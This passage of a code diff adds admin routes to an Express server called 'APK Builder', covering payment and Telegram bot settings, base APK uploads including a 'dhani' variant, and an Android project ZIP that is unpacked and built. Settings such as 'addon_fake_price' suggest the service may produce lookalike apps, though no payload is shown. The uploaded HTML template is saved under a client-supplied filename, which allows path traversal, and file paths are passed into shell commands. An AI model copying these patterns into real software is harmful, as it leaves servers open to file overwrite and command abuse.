+    ORDER BY u.id DESC
+  `).all();
+  res.json(users);
+});
+
+// Settings
+app.get('/api/admin/settings', requireAdmin, (req, res) => {
+  const rows = db.prepare('SELECT key,value FROM settings').all();
+  const result = {};
+  rows.forEach(r => result[r.key] = r.value);
+  res.json(result);
+});
+
+app.post('/api/admin/settings', requireAdmin, adminUpload.fields([
+  { name: 'upi_qr_image', maxCount: 1 },
+  { name: 'loading_html', maxCount: 1 }
+]), (req, res) => {
+  const allowed = ['upi_id','coin_rate','site_name','telegram_bot_token','telegram_admin_id','addon_fake_price','domain_change_price'];
+  for (const key of allowed) {
+    if (req.body[key] !== undefined) {
+      db.prepare('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)').run(key, req.body[key]);
+    }
+  }
+  if (req.files?.upi_qr_image?.[0]) {
+    db.prepare('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)').run('upi_qr_image', path.basename(req.files.upi_qr_image[0].path));
+  }
+  if (req.files?.loading_html?.[0]) {
+    const f = req.files.loading_html[0];
+    const dest = path.join(__dirname, 'templates', f.originalname);
+    fs.renameSync(f.path, dest);
+    db.prepare('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)').run('loading_html_file', f.originalname);
+  }
+  const newToken = req.body.telegram_bot_token;
+  if (newToken !== undefined) initBot(newToken, db);
+  res.json({ success: true });
+});
+
+// Base APK upload (legacy)
+app.post('/api/admin/upload-base-apk', requireAdmin, adminUpload.single('apk'), (req, res) => {
+  if (!req.file) return res.json({ error: 'No file' });
+  const { type } = req.body;
+  const name = type === 'dhani' ? 'base_dhani.apk' : 'base_normal.apk';
+  const dest = path.join(__dirname, 'base-apks', name);
+  fs.renameSync(req.file.path, dest);
+  res.json({ success: true, name });
+});
+
+app.get('/api/admin/base-apks/status', requireAdmin, (req, res) => {
+  res.json({
+    normal: fs.existsSync(path.join(__dirname, 'base-apks', 'base_normal.apk')),
+    dhani:  fs.existsSync(path.join(__dirname, 'base-apks', 'base_dhani.apk'))
+  });
+});
+
+// ── Android Project ZIP upload ──
+app.post('/api/admin/upload-android-project', requireAdmin, projectUpload.single('zip'), (req, res) => {
+  if (!req.file) return res.json({ error: 'No file uploaded' });
+  const { execSync } = require('child_process');
+  const dest   = path.join(__dirname, 'android-project');
+  const tmpDir = path.join(__dirname, '_zip_tmp_' + Date.now());
+  try {
+    fs.rmSync(dest,   { recursive: true, force: true });
+    fs.mkdirSync(tmpDir, { recursive: true });
+    execSync(`unzip -o "${req.file.path}" -d "${tmpDir}"`, { stdio: 'pipe' });
+    // If ZIP has a single top-level folder, use its contents
+    const entries = fs.readdirSync(tmpDir);
+    const src = (entries.length === 1 && fs.statSync(path.join(tmpDir, entries[0])).isDirectory())
+      ? path.join(tmpDir, entries[0])
+      : tmpDir;
+    execSync(`cp -r "${src}" "${dest}"`, { stdio: 'pipe' });
+    fs.rmSync(tmpDir, { recursive: true, force: true });
+    fs.unlinkSync(req.file.path);
+    // Auto-generate gradlew if not present
+    if (!fs.existsSync(path.join(dest, 'gradlew'))) {
+      execSync('gradle wrapper --gradle-version 8.6', { cwd: dest, stdio: 'pipe' });
+      execSync(`chmod +x "${path.join(dest, 'gradlew')}"`, { stdio: 'pipe' });
+    }
+    res.json({ success: true });
+  } catch(e) {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
+    try { fs.unlinkSync(req.file.path); } catch {}
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/admin/android-project/status', requireAdmin, (req, res) => {
+  const exists = fs.existsSync(path.join(__dirname, 'android-project', 'gradlew'));
+  res.json({ uploaded: exists });
+});
+
+// ── Serve frontend pages ──
+app.get('/admin*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html'));
+});
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+app.listen(PORT, () => {
+  console.log(`APK Builder running on port ${PORT}`);
+});
